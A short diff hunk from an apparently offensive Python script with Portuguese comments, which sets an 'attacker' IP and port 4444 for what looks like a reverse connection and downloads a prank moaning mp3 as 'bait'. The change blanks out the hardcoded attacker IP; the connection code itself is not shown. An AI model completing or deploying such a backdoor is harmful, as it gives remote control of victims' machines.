@@ -7,7 +7,7 @@ import time # Lib usada para esperar um determinado tempo ate se reconectar ao a
 import urllib3 # Lib usada para baixar o mp3 do bait do gemido
 from pygame import mixer # Lib usada para usar o bait do gemido
 
-attacker_ip = "192.168.25.9" # IP do atacante
+attacker_ip = "" # IP do atacante
 attacker_port = 4444 # Porta do atacante
 gemido_link = "http://www.whatstube.com.br/wp-content/uploads/2015/10/mulher-gemendo-alto.mp3" # Link para baixar o bait do gemido
 http = urllib3.PoolManager()
